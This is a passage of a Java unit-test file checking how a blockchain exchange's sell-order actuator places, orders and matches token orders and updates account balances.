    Assert.assertEquals(1,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));
    List<byte[]> priceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 1);
    MarketOrderPair tokenPair = MarketUtils.decodeKeyToMarketPair(priceKeysList.get(0));
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(sellTokenId.getBytes()),
        tokenPair.getSellTokenId().toByteArray());
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(buyTokenId.getBytes()),
        tokenPair.getBuyTokenId().toByteArray());

    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(priceKeysList.get(0));
    // 100_000000L:200_000000L => 1:2
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(2L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        tokenPair.getSellTokenId().toByteArray(), tokenPair.getBuyTokenId().toByteArray(),
        marketPrice.getSellTokenQuantity(), marketPrice.getBuyTokenQuantity());
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .get(pairPriceKey);
    Assert.assertEquals(1, orderIdListCapsule.getOrderSize(orderStore));
    Assert.assertArrayEquals(orderIdListCapsule.getHead(),
        orderId.toByteArray());
  }


  /**
   * no buy orders before，add multiple sell orders,need to maintain the correct sequence
   */
  @Test
  public void noBuyAddMultiSellOrder1() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    // TOKEN_ID_ONE has the same value as TOKEN_ID_ONE
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 300L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_1  and buy id_2) with different price by the same account
    //TOKEN_ID_ONE is twice as expensive as TOKEN_ID_TWO
    //order_1
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        200L, OWNER_ADDRESS_FIRST);
    //order_2
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        400L, OWNER_ADDRESS_FIRST);

    //the final price order should be : order_1, order_current, order_2
    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(3, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(2);

    //check pairToPrice
    Assert.assertEquals(3,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));
    List<byte[]> priceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 3);
    MarketOrderPair tokenPair = MarketUtils.decodeKeyToMarketPair(priceKeysList.get(0));
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(sellTokenId.getBytes()),
        tokenPair.getSellTokenId().toByteArray());
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(buyTokenId.getBytes()),
        tokenPair.getBuyTokenId().toByteArray());

    //This order should be second one
    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(priceKeysList.get(1));
    // 100:300 => 1:3
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(3L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        tokenPair.getSellTokenId().toByteArray(), tokenPair.getBuyTokenId().toByteArray(),
        marketPrice.getSellTokenQuantity(), marketPrice.getBuyTokenQuantity());
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .get(pairPriceKey);
    Assert.assertEquals(1, orderIdListCapsule.getOrderSize(orderStore));
    Assert.assertArrayEquals(orderIdListCapsule.getHead(),
        orderId.toByteArray());
  }


  /**
   * no buy orders before，add multiple sell orders,need to maintain the correct sequence,same price
   */
  @Test
  public void noBuyAddMultiSellOrderSamePrice1() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    // TOKEN_ID_ONE has the same value as TOKEN_ID_ONE
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 300L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_1  and buy id_2) with different price by the same account
    //TOKEN_ID_ONE is twice as expensive as TOKEN_ID_TWO
    //order_1
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        200L, OWNER_ADDRESS_FIRST);
    //order_2
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        300L, OWNER_ADDRESS_FIRST);

    //the final price order should be : order_1, order_current, order_2
    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(3, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(2);

    //check pairToPrice
    Assert.assertEquals(2,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));

    List<byte[]> priceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 2);
    MarketOrderPair tokenPair = MarketUtils.decodeKeyToMarketPair(priceKeysList.get(0));
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(sellTokenId.getBytes()),
        tokenPair.getSellTokenId().toByteArray());
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(buyTokenId.getBytes()),
        tokenPair.getBuyTokenId().toByteArray());

    //This order should be second one
    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(priceKeysList.get(1));
    // 100:300 => 1:3
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(3L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        tokenPair.getSellTokenId().toByteArray(), tokenPair.getBuyTokenId().toByteArray(),
        marketPrice.getSellTokenQuantity(), marketPrice.getBuyTokenQuantity());
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .get(pairPriceKey);
    Assert.assertEquals(2, orderIdListCapsule.getOrderSize(orderStore));
    Assert
        .assertArrayEquals(orderIdListCapsule.getOrderByIndex(1, orderStore).getID().toByteArray(),
            orderId.toByteArray());
  }


  /**
   * has buy orders before，add first sell order，not match
   */
  @Test
  public void hasBuyAddFirstSellOrderNotMatch1() throws Exception {

    InitAsset();

    //TOKEN_ID_ONE has the same value as TOKEN_ID_ONE
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 100L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book
    //add three order with different price by the same account

    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_FIRST);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        300L, OWNER_ADDRESS_FIRST);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        400L, OWNER_ADDRESS_FIRST);

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(0L,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(4, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(3);

    //check order
    MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    Assert.assertEquals(orderCapsule.getSellTokenQuantityRemain(), sellTokenQuant);

    //check pairToPrice
    Assert.assertEquals(1,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));

    List<byte[]> priceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 1);
    MarketOrderPair tokenPair = MarketUtils.decodeKeyToMarketPair(priceKeysList.get(0));
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(sellTokenId.getBytes()),
        tokenPair.getSellTokenId().toByteArray());
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(buyTokenId.getBytes()),
        tokenPair.getBuyTokenId().toByteArray());

    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(priceKeysList.get(0));
    // 100:100 => 1:1
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(1L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        tokenPair.getSellTokenId().toByteArray(), tokenPair.getBuyTokenId().toByteArray(),
        marketPrice.getSellTokenQuantity(), marketPrice.getBuyTokenQuantity());
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .get(pairPriceKey);
    Assert.assertEquals(1, orderIdListCapsule.getOrderSize(orderStore));
    Assert.assertArrayEquals(orderIdListCapsule.getHead(),
        orderId.toByteArray());
  }


  /**
   * has buy orders and sell orders before，add sell order ，not match,need to maintain the sequence
   * order
   */
  @Test
  public void hasBuySellAddSellOrderNotMatch1() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    // TOKEN_ID_ONE has the same value as TOKEN_ID_ONE
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 100L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_2 and buy id_1) with different price by the same account
    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_FIRST);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        400L, OWNER_ADDRESS_FIRST);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        300L, OWNER_ADDRESS_FIRST);

    //add three order(sell id_1  and buy id_2)
    //TOKEN_ID_ONE is twice as expensive as TOKEN_ID_TWO
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        200L, OWNER_ADDRESS_FIRST);
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        300L, OWNER_ADDRESS_FIRST);
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        400L, OWNER_ADDRESS_FIRST);

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    // Assert.assertTrue(accountCapsule.getAssetMapV2().get(sellTokenId) == 0L);
    Assert.assertEquals(0L,
            accountCapsule.getAssetV2MapForTest().get(sellTokenId).longValue());

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(7, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(6);

    //check order
    MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    Assert.assertEquals(orderCapsule.getSellTokenQuantityRemain(), sellTokenQuant);

    //check pairToPrice
    Assert.assertEquals(4,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));

    List<byte[]> priceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 4);
    MarketOrderPair marketPair = MarketUtils.decodeKeyToMarketPair(priceKeysList.get(0));
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(sellTokenId.getBytes()),
        marketPair.getSellTokenId().toByteArray());
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(buyTokenId.getBytes()),
        marketPair.getBuyTokenId().toByteArray());

    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(priceKeysList.get(0));
    // 100:100 => 1:1
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(1L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        marketPair.getSellTokenId().toByteArray(), marketPair.getBuyTokenId().toByteArray(),
        marketPrice.getSellTokenQuantity(), marketPrice.getBuyTokenQuantity());
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .get(pairPriceKey);
    Assert.assertEquals(1, orderIdListCapsule.getOrderSize(orderStore));
    Assert
        .assertArrayEquals(orderIdListCapsule.getOrderByIndex(0, orderStore).getID().toByteArray(),
            orderId.toByteArray());
  }

  // @Test
  public void matchTimeTest() throws Exception {
    InitAsset();
    int num = 10;
    int numMatch = 20;
    int k = 0;
    long sum = 0;
    while (k < num) {
      sum += doMatchTimeTest(numMatch);
      k++;
      System.out.println("sum:" + sum);
    }
    System.out.println("time:" + sum / num);
  }

  public long doMatchTimeTest(int num) throws Exception {

    MarketSellAssetActuator.setMAX_ACTIVE_ORDER_NUM(10000);
    //(sell id_1  and buy id_2)
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 2000L * num;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 1000L * num;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_2 and buy id_1) with different price by the same account
    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    for (int i = 0; i < num; i++) {
      addOrder(TOKEN_ID_TWO, 1000L + i / 10, TOKEN_ID_ONE,
          2000L, OWNER_ADDRESS_SECOND);
    }

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    long l = System.nanoTime();
    actuator.validate();
    actuator.execute(ret);
    // System.out.println("time:"+(System.currentTimeMillis() - l));
    return (System.nanoTime() - l);
  }


  /**
   * all match with 2 existing same price buy orders and complete this order
   */
  @Test
  public void matchAll2SamePriceBuyOrders1() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 400L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 200L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_2 and buy id_1) with different price by the same account
    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        300L, OWNER_ADDRESS_SECOND);

    //add three order(sell id_1  and buy id_2)
    //TOKEN_ID_ONE is twice as expensive as TOKEN_ID_TWO
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        200L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        300L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
        400L, OWNER_ADDRESS_SECOND);

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(0L,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));
    Assert.assertEquals(200L,
            (long) accountCapsule.getAssetV2MapForTest().get(buyTokenId));

    byte[] makerAddress = ByteArray.fromHexString(OWNER_ADDRESS_SECOND);
    AccountCapsule makerAccountCapsule = dbManager.getAccountStore().get(makerAddress);
    Assert.assertEquals(400L,
            (long) makerAccountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(0, accountOrderCapsule.getCount());
    // ByteString orderId = accountOrderCapsule.getOrdersList().get(0);

    MarketAccountOrderCapsule makerAccountOrderCapsule = marketAccountStore.get(makerAddress);
    Assert.assertEquals(4, makerAccountOrderCapsule.getCount());
    // ByteString makerOrderId1 = makerAccountOrderCapsule.getOrdersList().get(0);
    // ByteString makerOrderId2 = makerAccountOrderCapsule.getOrdersList().get(1);

    //check order
    // MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    // Assert.assertEquals(0L, orderCapsule.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, orderCapsule.getSt());

    // MarketOrderCapsule makerOrderCapsule1 = orderStore.get(makerOrderId1.toByteArray());
    // Assert.assertEquals(0L, makerOrderCapsule1.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, makerOrderCapsule1.getSt());

    // MarketOrderCapsule makerOrderCapsule2 = orderStore.get(makerOrderId2.toByteArray());
    // Assert.assertEquals(0L, makerOrderCapsule2.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, makerOrderCapsule2.getSt());

    //check pairToPrice
    Assert.assertEquals(3,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));

    List<byte[]> takerPriceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 3);
    MarketPrice takerPrice = MarketUtils.decodeKeyToMarketPrice(takerPriceKeysList.get(0));
    // 100:200 => 1:2
    Assert.assertEquals(1L, takerPrice.getSellTokenQuantity());
    Assert.assertEquals(2L, takerPrice.getBuyTokenQuantity());

    Assert.assertEquals(1,
        pairToPriceStore.getPriceNum(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes()));

    List<byte[]> makerPriceKeysList = pairPriceToOrderStore
        .getPriceKeysList(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(), 1);
    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(makerPriceKeysList.get(0));
    // 100:300 => 1:3
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(3L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(),
        100L, 200L);
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .getUnchecked(pairPriceKey);
    Assert.assertNull(orderIdListCapsule);

    pairPriceKey = MarketUtils.createPairPriceKey(
        TOKEN_ID_ONE.getBytes(), TOKEN_ID_TWO.getBytes(),
        400L, 200L);
    orderIdListCapsule = pairPriceToOrderStore
        .getUnchecked(pairPriceKey);
    Assert.assertNull(orderIdListCapsule);

    Assert.assertEquals(2, ret.getOrderDetailsList().size());

    MarketOrderDetail orderDetail = ret.getOrderDetailsList().get(0);
    // Assert.assertEquals(makerOrderCapsule1.getID(), orderDetail.getMakerOrderId());
    // Assert.assertEquals(orderCapsule.getID(), orderDetail.getTakerOrderId());
    Assert.assertEquals(200L, orderDetail.getFillSellQuantity());
    Assert.assertEquals(100L, orderDetail.getFillBuyQuantity());
    MarketOrderCapsule orderCapsule = orderStore.get(orderDetail.getMakerOrderId().toByteArray());
    Assert.assertEquals(0L, orderCapsule.getSellTokenQuantityRemain());
    Assert.assertEquals(State.INACTIVE, orderCapsule.getSt());

    orderDetail = ret.getOrderDetailsList().get(1);
    // Assert.assertEquals(makerOrderCapsule2.getID(), orderDetail.getMakerOrderId());
    // Assert.assertEquals(orderCapsule.getID(), orderDetail.getTakerOrderId());
    Assert.assertEquals(200L, orderDetail.getFillSellQuantity());
    Assert.assertEquals(100L, orderDetail.getFillBuyQuantity());
    orderCapsule = orderStore.get(orderDetail.getMakerOrderId().toByteArray());
    Assert.assertEquals(0L, orderCapsule.getSellTokenQuantityRemain());
    Assert.assertEquals(State.INACTIVE, orderCapsule.getSt());

  }

  /**
   * match with 2 existing buy orders and complete the makers
   */
  @Test
  public void partMatchMakerBuyOrders1() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 800L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 200L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    // Initialize the order book

    //add three order(sell id_2 and buy id_1) with different price by the same account
    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        300L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        500L, OWNER_ADDRESS_SECOND);

    Assert.assertEquals(3,
        pairToPriceStore.getPriceNum(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes()));

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(0L,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));
    Assert.assertEquals(200L,
            (long) accountCapsule.getAssetV2MapForTest().get(buyTokenId));

    byte[] makerAddress = ByteArray.fromHexString(OWNER_ADDRESS_SECOND);
    AccountCapsule makerAccountCapsule = dbManager.getAccountStore().get(makerAddress);
    Assert.assertEquals(500L,
            (long) makerAccountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(1, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(0);

    MarketAccountOrderCapsule makerAccountOrderCapsule = marketAccountStore.get(makerAddress);
    Assert.assertEquals(1, makerAccountOrderCapsule.getCount());
    // ByteString makerOrderId1 = makerAccountOrderCapsule.getOrdersList().get(0);
